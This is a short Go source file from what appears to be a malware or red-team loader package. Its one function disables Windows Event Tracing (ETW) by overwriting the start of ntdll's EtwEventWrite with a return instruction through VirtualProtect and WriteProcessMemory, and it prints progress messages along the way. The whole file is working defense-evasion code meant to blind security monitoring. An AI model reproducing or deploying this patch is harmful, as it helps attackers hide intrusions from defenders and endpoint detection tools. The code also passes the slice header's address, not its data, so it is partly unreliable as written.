package loader

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

var(
	fntdll               = syscall.NewLazyDLL("ntdll.dll")
	fucketw  = fntdll.NewProc("EtwEventWrite")

	k32              = syscall.NewLazyDLL("kernel32.dll")
	WriteProcessMemory  = k32.NewProc("WriteProcessMemory")
)



func etw(hProcess  uintptr){

	fmt.Println("patching .NET ETW ......")
	var oldProtect uint32
	var patch = []byte{0xc3}

	e := windows.VirtualProtect(fucketw.Addr(), 1, syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
	if e != nil {
		return
	}

	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch)), uintptr(len(patch)),0)



	e = windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
	if e != nil {
		return
	}

	fmt.Println("ETW patched!!\n")

	return
}